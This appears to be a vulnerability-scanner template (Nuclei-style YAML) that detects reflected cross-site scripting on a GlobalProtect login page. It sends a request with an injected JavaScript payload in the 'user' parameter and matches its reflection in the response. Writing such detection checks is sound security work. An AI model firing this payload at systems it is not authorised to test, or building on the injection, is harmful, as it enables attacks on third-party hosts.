id: global-project-xss

info:
  name: Global Project XSS
  author: dhiyaneshDk
  severity: medium
  tags: global,xss

requests:
  - method: GET
    path:
      - '{{BaseURL}}/global-protect/login.esp?user=j%22;-alert(1)-%22x'
    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - var valueUser = "j";-alert(1)-"x";
        part: body
      - type: word
        words:
          - "text/html"
        part: header
      - type: status
        status:
          - 200
